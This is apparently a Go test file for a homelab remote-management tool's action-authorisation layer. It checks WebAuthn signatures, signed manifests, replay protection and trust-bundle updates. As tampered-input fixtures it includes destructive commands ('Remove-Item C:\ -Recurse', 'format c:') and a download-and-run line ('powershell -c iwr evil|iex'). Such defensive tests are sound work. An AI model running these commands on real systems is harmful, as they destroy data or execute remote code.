package actionauth_test

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/MonsterCouch/homelab-rmm/internal/actionauth"
	"github.com/MonsterCouch/homelab-rmm/internal/actionauth/authtest"
	"github.com/MonsterCouch/homelab-rmm/internal/protocol"
)

const agentID = "agent_1"

// ---- canonical JSON (RFC 8785) ----

func TestCanonicalRFC8785(t *testing.T) {
	cases := []struct{ in, want string }{
		// RFC 8785 §3.2.3 key ordering by UTF-16 code units.
		{`{"\u20ac":"Euro Sign","\r":"Carriage Return","\ufb33":"Hebrew Letter Dalet With Dagesh","1":"One","\ud83d\ude00":"Emoji: Grinning Face","\u0080":"Control","\u00f6":"Latin Small Letter O With Diaeresis"}`,
			"{\"\\r\":\"Carriage Return\",\"1\":\"One\",\"\u0080\":\"Control\",\"\u00f6\":\"Latin Small Letter O With Diaeresis\",\"\u20ac\":\"Euro Sign\",\"\U0001F600\":\"Emoji: Grinning Face\",\"\ufb33\":\"Hebrew Letter Dalet With Dagesh\"}"},
		// Escaping: only " \ and control characters; <>& and U+2028 stay literal.
		{`{"a":"<b>&\u2028\u000f\n"}`, "{\"a\":\"<b>&\u2028\\u000f\\n\"}"},
		// Numbers as ECMAScript formats them.
		{`[1e21,1e-7,0.000001,-0,4.50,1E+2,123456789012345680000,9007199254740991]`,
			`[1e+21,1e-7,0.000001,0,4.5,100,123456789012345680000,9007199254740991]`},
		// Whitespace and nesting.
		{" { \"b\" : [ true , null ] , \"a\" : { } } ", `{"a":{},"b":[true,null]}`},
	}
	for _, c := range cases {
		got, err := actionauth.CanonicalizeJSON([]byte(c.in))
		if err != nil {
			t.Fatalf("%s: %v", c.in, err)
		}
		if string(got) != c.want {
			t.Errorf("canonical(%s)\n got %s\nwant %s", c.in, got, c.want)
		}
	}
	for _, bad := range []string{`{"a":1,"a":2}`, `{"a":1} {}`, "\"\xff\""} {
		if _, err := actionauth.CanonicalizeJSON([]byte(bad)); err == nil {
			t.Errorf("accepted %q", bad)
		}
	}
}

// ---- fixtures ----

type fixture struct {
	alice, alice2, bob *authtest.Key
	rec                *authtest.RecoveryKey
	bundle             *actionauth.Bundle
	v                  *actionauth.Verifier
	now                time.Time
}

func newFixture(t *testing.T, policy actionauth.Policy) *fixture {
	t.Helper()
	f := &fixture{
		alice:  authtest.NewKey("alice", actionauth.AlgES256),
		alice2: authtest.NewKey("alice", actionauth.AlgEdDSA),
		bob:    authtest.NewKey("bob", actionauth.AlgRS256),
		rec:    authtest.NewRecoveryKey("recovery-1"),
		now:    time.Now(),
	}
	raw := authtest.Bundle(authtest.BundleSpec{Keys: []*authtest.Key{f.alice, f.alice2, f.bob},
		Recovery: []*authtest.RecoveryKey{f.rec}, Policy: policy})
	b, err := actionauth.ParseBundle(raw)
	if err != nil {
		t.Fatal(err)
	}
	f.bundle = b
	f.v = &actionauth.Verifier{AgentID: agentID, Bundle: b, Nonces: actionauth.NewMemoryNonceStore(), Now: func() time.Time { return f.now }}
	return f
}

func scriptPayload(body string, args ...string) json.RawMessage {
	b, _ := json.Marshal(protocol.ScriptRun{RunID: "r1", Language: "powershell", Body: body, Args: args, Timeout: 60})
	return b
}

func action(op string, payload json.RawMessage, targets ...string) []byte {
	if len(targets) == 0 {
		targets = []string{agentID}
	}
	return authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindAction, Op: op, Payload: payload, Targets: targets})
}

// ---- WebAuthn assertions ----

func TestAssertionAlgorithms(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	for _, k := range []*authtest.Key{f.alice, f.alice2, f.bob} {
		m := action("proc.kill", json.RawMessage(`{"pid":1}`))
		d := f.v.Check("proc.kill", nil, authtest.Auth(m, k.Sign(m, authtest.SignOpts{})))
		if !d.Allow || !d.Verified || d.Err != nil {
			t.Errorf("alg %d: %+v", k.Alg, d)
		}
	}
}

func TestAssertionRejections(t *testing.T) {
	uv := actionauth.Policy{RequireUV: true}
	cases := []struct {
		name   string
		policy actionauth.Policy
		sign   func(f *fixture, m []byte) protocol.Assertion
	}{
		{"other document", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign([]byte("something else"), authtest.SignOpts{})
		}},
		{"untrusted origin", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign(m, authtest.SignOpts{Origin: "https://evil.test"})
		}},
		{"cross origin", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign(m, authtest.SignOpts{CrossOrigin: true})
		}},
		{"other relying party", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign(m, authtest.SignOpts{RPID: "evil.test"})
		}},
		{"no user presence", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign(m, authtest.SignOpts{NoUP: true})
		}},
		{"registration ceremony", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign(m, authtest.SignOpts{Type: "webauthn.create"})
		}},
		{"uv required", uv, func(f *fixture, m []byte) protocol.Assertion {
			return f.alice.Sign(m, authtest.SignOpts{})
		}},
		{"unknown credential", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			return authtest.NewKey("mallory", actionauth.AlgES256).Sign(m, authtest.SignOpts{})
		}},
		{"tampered signature", actionauth.Policy{}, func(f *fixture, m []byte) protocol.Assertion {
			a := f.alice.Sign(m, authtest.SignOpts{})
			a.Sig = actionauth.EncodeB64([]byte("not a signature at all, sorry"))
			return a
		}},
	}
	for _, c := range cases {
		f := newFixture(t, c.policy)
		m := action("proc.kill", json.RawMessage(`{"pid":1}`))
		d := f.v.Check("proc.kill", nil, authtest.Auth(m, c.sign(f, m)))
		if d.Allow || !errors.Is(d.Err, actionauth.ErrSignature) {
			t.Errorf("%s: want refusal with ErrSignature, got allow=%v err=%v", c.name, d.Allow, d.Err)
		}
	}
	// UV satisfied passes.
	f := newFixture(t, uv)
	m := action("proc.kill", json.RawMessage(`{"pid":1}`))
	if d := f.v.Check("proc.kill", nil, authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{UV: true}))); !d.Allow {
		t.Errorf("UV assertion refused: %v", d.Err)
	}
}

// ---- verifier decisions ----

func TestNoBundleAndReadOps(t *testing.T) {
	v := &actionauth.Verifier{AgentID: agentID, Nonces: actionauth.NewMemoryNonceStore()}
	if d := v.Check("script.run", scriptPayload("x"), nil); !d.Allow || d.Verified || d.Report() {
		t.Errorf("no bundle must behave as today: %+v", d)
	}
	f := newFixture(t, actionauth.Policy{})
	for _, op := range []string{"ping", "proc.list", "shell.input", "baseline.evaluate", "agent.config", "trust.update"} {
		if d := f.v.Check(op, nil, nil); !d.Allow || d.Err != nil {
			t.Errorf("%s needs no signature: %+v", op, d)
		}
	}
}

func TestEnforceAndAudit(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	d := f.v.Check("script.run", scriptPayload("evil"), nil)
	if d.Allow || !errors.Is(d.Err, actionauth.ErrUnsigned) || !d.Report() {
		t.Errorf("enforce, unsigned: %+v", d)
	}
	a := newFixture(t, actionauth.Policy{Mode: actionauth.ModeAudit})
	d = a.v.Check("script.run", scriptPayload("evil"), nil)
	if !d.Allow || d.Err == nil || !d.Report() || string(d.Payload) != string(scriptPayload("evil")) {
		t.Errorf("audit must run the request as sent and report: %+v", d)
	}
}

func TestActionRunsSignedPayloadOnce(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	signed := scriptPayload("Restart-Service Spooler")
	m := action("script.run", signed)
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	// The envelope carries a different body: the signed one must win.
	d := f.v.Check("script.run", scriptPayload("Remove-Item C:\\ -Recurse"), auth)
	var ran protocol.ScriptRun
	if !d.Allow || !d.Verified || json.Unmarshal(d.Payload, &ran) != nil || ran.Body != "Restart-Service Spooler" {
		t.Fatalf("signed action: %+v", d)
	}
	if len(d.Signers) != 1 || d.Signers[0] != "alice" {
		t.Errorf("signers = %v", d.Signers)
	}
	if d := f.v.Check("script.run", nil, auth); d.Allow || !errors.Is(d.Err, actionauth.ErrReplay) {
		t.Errorf("replay: %+v", d)
	}
}

// One signed script, many agents: each keeps its own run_id, but nothing
// else from the envelope survives.
func TestCorrelationFieldsOnly(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	signed, _ := json.Marshal(map[string]any{"language": "powershell", "body": "Get-Date", "timeout_sec": 60})
	m := action("script.run", signed, agentID, "agent_2")
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	env, _ := json.Marshal(map[string]any{"run_id": "run-agent-1", "language": "cmd", "body": "format c:", "timeout_sec": 1})
	d := f.v.Check("script.run", env, auth)
	if !d.Allow {
		t.Fatal(d.Err)
	}
	var got protocol.ScriptRun
	if err := json.Unmarshal(d.Payload, &got); err != nil {
		t.Fatal(err)
	}
	if got.RunID != "run-agent-1" || got.Body != "Get-Date" || got.Language != "powershell" || got.Timeout != 60 {
		t.Errorf("merged payload %+v", got)
	}
}

func TestTimeTargetAndScope(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	sign := func(m []byte) *protocol.ActionAuth { return authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{})) }
	now := f.now.Unix()
	cases := []struct {
		name string
		m    []byte
		op   string
		want error
	}{
		{"expired", authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindAction, Op: "power", Payload: json.RawMessage(`{"action":"reboot"}`), Targets: []string{agentID}, IAT: now - 600, Exp: now - 1}), "power", actionauth.ErrExpired},
		{"future", authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindAction, Op: "power", Payload: json.RawMessage(`{"action":"reboot"}`), Targets: []string{agentID}, IAT: now + 3600, Exp: now + 3900}), "power", actionauth.ErrClock},
		{"other agent", action("power", json.RawMessage(`{"action":"reboot"}`), "agent_2"), "power", actionauth.ErrTarget},
		{"other org", authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindAction, Org: "org_other", Op: "power", Payload: json.RawMessage(`{"action":"reboot"}`), Targets: []string{agentID}}), "power", actionauth.ErrTarget},
		{"other op", action("proc.kill", json.RawMessage(`{"pid":4}`)), "power", actionauth.ErrScope},
	}
	for _, c := range cases {
		if d := f.v.Check(c.op, nil, sign(c.m)); d.Allow || !errors.Is(d.Err, c.want) {
			t.Errorf("%s: want %v, got allow=%v err=%v", c.name, c.want, d.Allow, d.Err)
		}
	}
	// Within the clock-skew allowance is fine.
	m := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindAction, Op: "power", Payload: json.RawMessage(`{"action":"reboot"}`), Targets: []string{agentID}, IAT: now + 120, Exp: now + 400})
	if d := f.v.Check("power", nil, sign(m)); !d.Allow {
		t.Errorf("2 min of skew refused: %v", d.Err)
	}
}

func TestGrant(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	m := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindGrant, Ops: []string{"fs.list", "fs.read"}, Targets: []string{agentID}})
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	for i := 0; i < 3; i++ { // reusable until it expires
		if d := f.v.Check("fs.read", json.RawMessage(`{"path":"C:\\x"}`), auth); !d.Allow {
			t.Fatalf("grant use %d: %v", i, d.Err)
		}
	}
	if d := f.v.Check("shell.open", nil, auth); d.Allow || !errors.Is(d.Err, actionauth.ErrScope) {
		t.Errorf("grant reached an op it does not list: %+v", d)
	}
	bad := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindGrant, Ops: []string{"script.run"}, Targets: []string{agentID}})
	if _, err := actionauth.ParseManifest(bad); err == nil {
		t.Error("an action-class op was grantable")
	}
}

func TestThresholds(t *testing.T) {
	f := newFixture(t, actionauth.Policy{HighThreshold: 2, BulkLimit: 2})
	upd := json.RawMessage(`{"url":"https://x/agent","sha256":"00"}`)
	m := action("agent.update", upd)
	if d := f.v.Check("agent.update", nil, authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}), f.alice2.Sign(m, authtest.SignOpts{}))); d.Allow {
		t.Error("two keys of one owner counted as two signers")
	}
	m = action("agent.update", upd)
	if d := f.v.Check("agent.update", nil, authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}), f.bob.Sign(m, authtest.SignOpts{}))); !d.Allow {
		t.Errorf("two owners refused: %v", d.Err)
	}
	// Bulk: three targets exceed bulk_limit 2, so one signer is not enough.
	m = action("proc.kill", json.RawMessage(`{"pid":1}`), agentID, "agent_2", "agent_3")
	if d := f.v.Check("proc.kill", nil, authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))); d.Allow {
		t.Error("bulk action passed with one signer")
	}
}

func TestStandingApprovals(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	body := "Get-Service | Where Status -eq Stopped"
	sum := sha256.Sum256([]byte(body))
	m := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindStanding, Targets: []string{"*"}, Exp: time.Now().Unix() + 86400,
		Constraints: &actionauth.Constraints{Op: "script.run", BodySHA256: hex.EncodeToString(sum[:]), Language: "powershell", Args: []string{"-v"}}})
	// "*" exceeds the bulk limit; with the default high threshold of 1 one signer suffices.
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	for i := 0; i < 2; i++ { // reusable
		if d := f.v.Check("script.run", scriptPayload(body, "-v"), auth); !d.Allow {
			t.Fatalf("approved script refused: %v", d.Err)
		}
	}
	for name, p := range map[string]json.RawMessage{
		"other body": scriptPayload(body+"; Remove-Item C:\\", "-v"),
		"other args": scriptPayload(body, "-v", "-x"),
		"no args":    scriptPayload(body),
	} {
		if d := f.v.Check("script.run", p, auth); d.Allow || !errors.Is(d.Err, actionauth.ErrScope) {
			t.Errorf("%s: %+v", name, d)
		}
	}

	pm := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindStanding, Targets: []string{agentID},
		Constraints: &actionauth.Constraints{Op: "power", PowerAction: "reboot"}})
	pa := authtest.Auth(pm, f.alice.Sign(pm, authtest.SignOpts{}))
	if d := f.v.Check("power", json.RawMessage(`{"action":"reboot"}`), pa); !d.Allow {
		t.Errorf("approved reboot refused: %v", d.Err)
	}
	if d := f.v.Check("power", json.RawMessage(`{"action":"shutdown"}`), pa); d.Allow {
		t.Error("a reboot approval allowed a shutdown")
	}

	blank := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindStanding, Targets: []string{agentID},
		Constraints: &actionauth.Constraints{Op: "fs.write"}})
	if d := f.v.Check("fs.write", json.RawMessage(`{"path":"x"}`), authtest.Auth(blank, f.alice.Sign(blank, authtest.SignOpts{}))); d.Allow {
		t.Error("a standing approval without content binding was accepted")
	}
	star := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindAction, Op: "power", Payload: json.RawMessage(`{}`), Targets: []string{"*"}})
	if _, err := actionauth.ParseManifest(star); err == nil {
		t.Error(`an action accepted the org-wide "*" target`)
	}
}

func TestApproveSpec(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	spec := json.RawMessage(`{"id":7,"name":"Firewall on","checks":[{"kind":"command","check":"exit 0","fix":"netsh advfirewall set allprofiles state on"}]}`)
	h, err := actionauth.SpecHash(spec)
	if err != nil {
		t.Fatal(err)
	}
	m := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindStanding, Targets: []string{"*"}, Exp: time.Now().Unix() + 86400,
		Constraints: &actionauth.Constraints{Op: actionauth.SpecOp, SpecSHA256: h}})
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	reordered := json.RawMessage(`{ "checks":[{"fix":"netsh advfirewall set allprofiles state on","check":"exit 0","kind":"command"}], "name":"Firewall on", "id":7 }`)
	if err := f.v.ApproveSpec(reordered, auth); err != nil {
		t.Errorf("same spec, different key order and whitespace: %v", err)
	}
	tampered := json.RawMessage(`{"id":7,"name":"Firewall on","checks":[{"kind":"command","check":"exit 0","fix":"powershell -c iwr evil|iex"}]}`)
	if err := f.v.ApproveSpec(tampered, auth); !errors.Is(err, actionauth.ErrScope) {
		t.Errorf("tampered spec: %v", err)
	}
	if err := f.v.ApproveSpec(spec, nil); !errors.Is(err, actionauth.ErrUnsigned) {
		t.Errorf("unapproved spec: %v", err)
	}
}

func TestManifestStrictness(t *testing.T) {
	for name, raw := range map[string]string{
		"unknown field":  `{"v":1,"kind":"action","id":"a","org":"o","targets":["t"],"op":"power","payload":{},"nonce":"n","iat":1,"exp":2,"extra":true}`,
		"duplicate key":  `{"v":1,"kind":"action","kind":"grant","id":"a","org":"o","targets":["t"],"op":"power","payload":{},"nonce":"n","iat":1,"exp":2}`,
		"too long-lived": `{"v":1,"kind":"action","id":"a","org":"o","targets":["t"],"op":"power","payload":{},"nonce":"n","iat":1,"exp":100000}`,
		"no targets":     `{"v":1,"kind":"action","id":"a","org":"o","targets":[],"op":"power","payload":{},"nonce":"n","iat":1,"exp":2}`,
		"wrong version":  `{"v":2,"kind":"action","id":"a","org":"o","targets":["t"],"op":"power","payload":{},"nonce":"n","iat":1,"exp":2}`,
	} {
		if _, err := actionauth.ParseManifest([]byte(raw)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

// ---- trust bundle ----

func TestBundleRules(t *testing.T) {
	k := authtest.NewKey("alice", actionauth.AlgES256)
	if _, err := actionauth.ParseBundle(authtest.Bundle(authtest.BundleSpec{Keys: []*authtest.Key{k}})); err == nil {
		t.Error("enforce without a recovery key was accepted")
	}
	if _, err := actionauth.ParseBundle(authtest.Bundle(authtest.BundleSpec{Keys: []*authtest.Key{k}, Policy: actionauth.Policy{Mode: actionauth.ModeAudit, HighThreshold: 2}})); err == nil {
		t.Error("a threshold above the number of signers was accepted")
	}
}

func TestBundleUpdateChain(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	mallory := authtest.NewKey("mallory", actionauth.AlgES256)
	next := func(prev string, epoch int64, keys ...*authtest.Key) []byte {
		return authtest.Bundle(authtest.BundleSpec{Epoch: epoch, Prev: prev, Keys: keys, Recovery: []*authtest.RecoveryKey{f.rec}})
	}

	// Trust on first use.
	if b, err := actionauth.VerifyUpdate(nil, f.bundle.Raw(), nil, nil); err != nil || b.Epoch != 1 {
		t.Fatalf("first bundle: %v", err)
	}

	good := next(f.bundle.Hash(), 2, f.alice, mallory)
	nb, err := actionauth.VerifyUpdate(f.bundle, good, []protocol.Assertion{f.bob.Sign(good, authtest.SignOpts{})}, nil)
	if err != nil {
		t.Fatalf("successor signed by a current signer: %v", err)
	}
	if nb.Epoch != 2 {
		t.Errorf("epoch %d", nb.Epoch)
	}

	// The server adding its own key and signing with it must fail.
	if _, err := actionauth.VerifyUpdate(f.bundle, good, []protocol.Assertion{mallory.Sign(good, authtest.SignOpts{})}, nil); err == nil {
		t.Error("a bundle signed only by a key it introduces was accepted")
	}
	// Chain rules.
	for name, raw := range map[string][]byte{
		"wrong prev":    next(strings.Repeat("0", 64), 2, f.alice),
		"skipped epoch": next(f.bundle.Hash(), 3, f.alice),
		"rollback":      next(f.bundle.Hash(), 1, f.alice),
		"org change": authtest.Bundle(authtest.BundleSpec{Epoch: 2, Prev: f.bundle.Hash(), Org: "org_other", Keys: []*authtest.Key{f.alice},
			Recovery: []*authtest.RecoveryKey{f.rec}}),
	} {
		if _, err := actionauth.VerifyUpdate(f.bundle, raw, []protocol.Assertion{f.alice.Sign(raw, authtest.SignOpts{})}, nil); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// Recovery: every operator key lost, the offline key signs the successor.
	lost := next(f.bundle.Hash(), 2, authtest.NewKey("alice", actionauth.AlgES256))
	if _, err := actionauth.VerifyUpdate(f.bundle, lost, nil, []protocol.RecoverySig{f.rec.Sign(lost)}); err != nil {
		t.Errorf("recovery signature refused: %v", err)
	}
	if _, err := actionauth.VerifyUpdate(f.bundle, lost, nil, []protocol.RecoverySig{authtest.NewRecoveryKey("recovery-1").Sign(lost)}); err == nil {
		t.Error("a recovery signature from an unknown key was accepted")
	}
}

// ---- nonce store ----

func TestFileNonceStoreSurvivesRestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nonces.json")
	s, err := actionauth.OpenFileNonceStore(path)
	if err != nil {
		t.Fatal(err)
	}
	exp := time.Now().Add(5 * time.Minute)
	if err := s.Consume("n1", exp); err != nil {
		t.Fatal(err)
	}
	s2, err := actionauth.OpenFileNonceStore(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := s2.Consume("n1", exp); !errors.Is(err, actionauth.ErrReplay) {
		t.Errorf("replay after restart: %v", err)
	}
	if err := s2.Consume("old", time.Now().Add(-time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := s2.Consume("old", time.Now().Add(time.Minute)); err != nil {
		t.Errorf("an expired nonce was not pruned: %v", err)
	}
	if err := os.WriteFile(path, []byte("{not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := actionauth.OpenFileNonceStore(path); err == nil {
		t.Error("a corrupt nonce store was silently reset")
	}
}

// ---- class table ----

// Every request type in internal/protocol must be classified explicitly, so a
// type added later cannot silently inherit a class nobody chose.
func TestEveryRequestTypeIsClassified(t *testing.T) {
	src, err := os.ReadFile(filepath.Join("..", "protocol", "protocol.go"))
	if err != nil {
		t.Fatal(err)
	}
	ops := regexp.MustCompile(`(?m)^\s+Req\w+\s*=\s*"([^"]+)"`).FindAllStringSubmatch(string(src), -1)
	if len(ops) < 30 {
		t.Fatalf("found only %d request types; the pattern no longer matches protocol.go", len(ops))
	}
	for _, m := range ops {
		if !actionauth.Classified(m[1]) {
			t.Errorf("request type %q has no class in internal/actionauth/policy.go", m[1])
		}
	}
}

func TestBuildManifestIsCanonical(t *testing.T) {
	m := actionauth.Manifest{V: 1, Kind: actionauth.KindAction, ID: "m1", Org: authtest.Org, Targets: []string{agentID},
		Op: "script.run", Payload: json.RawMessage(`{ "body" : "a<b", "language":"powershell" }`), Nonce: "n", IAT: 100, Exp: 200}
	raw, err := actionauth.BuildManifest(m)
	if err != nil {
		t.Fatal(err)
	}
	again, _ := actionauth.CanonicalizeJSON(raw)
	if string(raw) != string(again) || !strings.Contains(string(raw), `"body":"a<b"`) {
		t.Errorf("not canonical: %s", raw)
	}
	m.Targets = nil
	if _, err := actionauth.BuildManifest(m); err == nil {
		t.Error("an invalid manifest was built")
	}
}

// One signed script for many devices: each device's RMM_* variables come
// from its own envelope, but nothing else does, and none overrides a signed
// variable.
func TestDeviceEnvMerge(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	signed, _ := json.Marshal(map[string]any{"language": "powershell", "body": "Get-Date", "timeout_sec": 60,
		"env": map[string]string{"TARGET": "signed", "RMM_RUN_BY": "alice"}})
	m := action("script.run", signed, agentID, "agent_2")
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	env, _ := json.Marshal(map[string]any{"run_id": "r9", "env": map[string]string{
		"RMM_DEVICE_ID": agentID, "rmm_run_by": "server", "PSModulePath": "/attacker/modules", "TARGET": "server"}})
	d := f.v.Check("script.run", env, auth)
	if !d.Allow {
		t.Fatal(d.Err)
	}
	var got protocol.ScriptRun
	if err := json.Unmarshal(d.Payload, &got); err != nil {
		t.Fatal(err)
	}
	want := map[string]string{"TARGET": "signed", "RMM_RUN_BY": "alice", "RMM_DEVICE_ID": agentID}
	if len(got.Env) != len(want) {
		t.Fatalf("env %v, want %v", got.Env, want)
	}
	for k, v := range want {
		if got.Env[k] != v {
			t.Errorf("env %s = %q, want %q (got %v)", k, got.Env[k], v, got.Env)
		}
	}
}

// A standing approval binds body, language and args; an unattended run may
// add only the per-device RMM_* variables.
func TestStandingRefusesForeignEnv(t *testing.T) {
	f := newFixture(t, actionauth.Policy{})
	body := "Get-Service"
	sum := sha256.Sum256([]byte(body))
	m := authtest.Manifest(actionauth.Manifest{Kind: actionauth.KindStanding, Targets: []string{agentID},
		Constraints: &actionauth.Constraints{Op: "script.run", BodySHA256: hex.EncodeToString(sum[:]), Language: "powershell"}})
	auth := authtest.Auth(m, f.alice.Sign(m, authtest.SignOpts{}))
	run := func(env map[string]string) json.RawMessage {
		b, _ := json.Marshal(protocol.ScriptRun{RunID: "r", Language: "powershell", Body: body, Env: env})
		return b
	}
	if d := f.v.Check("script.run", run(map[string]string{"RMM_DEVICE_ID": agentID, "RMM_CF_SITE": "x"}), auth); !d.Allow {
		t.Errorf("device variables refused: %v", d.Err)
	}
	for _, k := range []string{"PSModulePath", "PATH", "rmm_lowercase"} {
		if d := f.v.Check("script.run", run(map[string]string{k: "x"}), auth); d.Allow || !errors.Is(d.Err, actionauth.ErrScope) {
			t.Errorf("%s accepted under a standing approval: %+v", k, d)
		}
	}
}

func TestBundleLogKeyRules(t *testing.T) {
	k := authtest.NewKey("alice", actionauth.AlgES256)
	rec := []*authtest.RecoveryKey{authtest.NewRecoveryKey("rec")}
	build := func(logKey string, require bool) error {
		raw := authtest.Bundle(authtest.BundleSpec{Keys: []*authtest.Key{k}, Recovery: rec,
			Policy: actionauth.Policy{RequireLogProof: require}})
		var m map[string]any
		if err := json.Unmarshal(raw, &m); err != nil {
			t.Fatal(err)
		}
		if logKey != "" {
			m["log_key"] = logKey
		}
		raw, _ = json.Marshal(m)
		_, err := actionauth.ParseBundle(raw)
		return err
	}
	if err := build("", true); err == nil {
		t.Error("require_log_proof without a log key was accepted")
	}
	if err := build("not a key", false); err == nil {
		t.Error("an unparsable log key was accepted")
	}
	if err := build("", false); err != nil {
		t.Errorf("a bundle without a log key was refused: %v", err)
	}
}
